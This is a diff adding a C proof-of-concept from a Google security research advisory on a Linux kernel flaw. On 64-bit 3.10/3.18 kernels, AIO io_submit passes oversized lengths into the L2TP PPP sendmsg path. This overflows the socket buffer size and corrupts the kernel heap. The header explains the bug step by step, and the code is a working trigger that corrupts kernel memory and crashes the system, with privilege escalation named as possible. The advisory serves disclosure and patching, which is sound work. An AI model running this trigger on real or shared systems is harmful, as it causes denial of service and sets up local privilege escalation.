@@ -1,0 +1,97 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=735
+
+In certain kernel versions it is possible to use the AIO subsystem (io_submit syscall) to pass size values larger than MAX_RW_COUNT to the networking subsystem's sendmsg implementation. In the L2TP PPP sendmsg implementation, a large size parameter can lead to an integer overflow and kernel heap corruption during socket buffer allocation. This could be exploited to allow local privilege escalation from an unprivileged user account.
+
+This issue affects 64-bit systems running older branches of the Linux kernel, such as version 3.10 and 3.18. More recent major versions aren't affected due to refactoring in the AIO subsystem. The attached proof-of-concept trigger has been tested on a fully updated Ubuntu 14.04 LTS server. This issue is also likely to affect 64-bit Android devices, which typically use branches of 3.10.
+
+The first observation is that an IOCB_CMD_PWRITE of a large length (such as 0xffffffff) will correctly bound the request iocb's ki_nbytes value to MAX_RW_COUNT. However, in the single vector case, if the relevant access_ok check passes in aio_setup_single_vector then the iov length will still be large (0xffffffff). On 64-bit systems it is possible for access_ok(type, user_ptr, 0xffffffff) to succeed.
+
+The second observation is that sock_aio_write does not use the iocb for the sendmsg size calculation, but instead takes the summation of all input iov lengths. Thus calling io_submit with an IOCB_CMD_PWRITE operation on a socket will result in a potentially large value being passed to sendmsg.
+
+The third observation is that AF_PPPOX sockets using the PX_PROTO_OL2TP protocol has a sendmsg implementation that does not bounds check the incoming length parameter (called total_len) before using the value to calculate the length of a socket buffer allocation (using sock_wmalloc).
+
+The fourth observation is that the underlying socket buffer allocation routine __alloc_skb uses an "unsigned int" for it's size parameter rather than a size_t, and that this value can wrap to a small positive value upon alignment calculations and internal space overhead calculations. This results in a small value being passed to kmalloc for the socket buffer data allocation. Then, the size is recalculated using SKB_WITH_OVERHEAD, which effectively re-underflows the size calculation to a small negative value (large unsigned value). The newly created socket buffer has a small backing data buffer and a large size. 
+
+The proof-of-concept trigger crashes when writing the skb_shared_info structure into the end of the socket buffer, which is out-of-bounds. Other corruption may also be possible in pppol2tp_sendmsg/l2tp_xmit_skb/ip_output.
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <linux/if.h>
+#include <linux/if_pppox.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <linux/aio_abi.h>
+
+int main(int argc, char *argv[]) {
+	struct sockaddr_pppol2tp sax;
+	struct sockaddr_in addr;
+	int s, sfd, ret;
+	struct iocb *iocbp;
+	struct iocb iocb;
+	aio_context_t ctx_id = 0;
+	void *data;
+
+	s = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP);
+
+	if (s == -1) {
+		perror("socket");
+		return -1;
+	}
+
+	memset(&sax, 0, sizeof(struct sockaddr_pppol2tp));
+
+	sax.sa_family = AF_PPPOX;
+	sax.sa_protocol = PX_PROTO_OL2TP;
+
+	sax.pppol2tp.fd = -1;
+	sax.pppol2tp.addr.sin_addr.s_addr = addr.sin_addr.s_addr;
+	sax.pppol2tp.addr.sin_port = addr.sin_port;
+	sax.pppol2tp.addr.sin_family = AF_INET;
+	sax.pppol2tp.s_tunnel  = -1;
+	sax.pppol2tp.s_session = 0;
+	sax.pppol2tp.d_tunnel  = -1;
+	sax.pppol2tp.d_session = 0;
+
+	sfd = connect(s, (struct sockaddr *)&sax, sizeof(sax));
+
+	if (sfd == -1) {
+		perror("connect");
+		return -1;
+	}
+
+	data = mmap(NULL, 0x100001000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+	if (data == MAP_FAILED) {
+		perror("mmap");
+		return -1;
+	}
+
+	memset(data, 0x41, 0x100001000);
+
+	ret = syscall(__NR_io_setup, 2, &ctx_id);
+
+	if (ret == -1) {
+		perror("io_setup");
+		return -1;
+	}
+
+	memset(&iocb, 0, sizeof(struct iocb));
+
+	iocb.aio_fildes = s;
+	iocb.aio_lio_opcode = IOCB_CMD_PWRITE;
+	iocb.aio_nbytes = 0xfffffe60;
+	iocb.aio_buf = (unsigned long) &data;
+
+	iocbp = &iocb;
+
+	syscall(__NR_io_submit, ctx_id, 1, &iocbp);
+
+	return 0;
+}
